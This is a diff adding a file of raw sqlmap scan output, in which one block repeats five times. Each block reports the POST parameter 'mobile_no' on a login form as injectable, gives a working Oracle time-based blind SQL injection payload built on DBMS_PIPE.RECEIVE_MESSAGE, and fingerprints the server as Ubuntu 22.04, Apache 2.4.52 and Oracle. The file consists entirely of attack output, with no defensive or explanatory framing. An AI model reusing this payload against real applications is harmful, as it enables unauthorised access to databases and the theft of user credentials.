@@ -1,0 +1,50 @@
+sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
+---
+Parameter: mobile_no (POST)
+    Type: time-based blind
+    Title: Oracle AND time-based blind
+    Payload: mobile_no=fghfghfgh' AND 7207=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(81)||CHR(85)||CHR(83),5) AND 'MbRM'='MbRM&password=fghfghfh&submit=
+---
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: Oracle
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: mobile_no (POST)
+    Type: time-based blind
+    Title: Oracle AND time-based blind
+    Payload: mobile_no=fghfghfgh' AND 7207=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(81)||CHR(85)||CHR(83),5) AND 'MbRM'='MbRM&password=fghfghfh&submit=
+---
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: Oracle
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: mobile_no (POST)
+    Type: time-based blind
+    Title: Oracle AND time-based blind
+    Payload: mobile_no=fghfghfgh' AND 7207=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(81)||CHR(85)||CHR(83),5) AND 'MbRM'='MbRM&password=fghfghfh&submit=
+---
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: Oracle
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: mobile_no (POST)
+    Type: time-based blind
+    Title: Oracle AND time-based blind
+    Payload: mobile_no=fghfghfgh' AND 7207=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(81)||CHR(85)||CHR(83),5) AND 'MbRM'='MbRM&password=fghfghfh&submit=
+---
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: Oracle
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: mobile_no (POST)
+    Type: time-based blind
+    Title: Oracle AND time-based blind
+    Payload: mobile_no=fghfghfgh' AND 7207=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(81)||CHR(85)||CHR(83),5) AND 'MbRM'='MbRM&password=fghfghfh&submit=
+---
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: Oracle
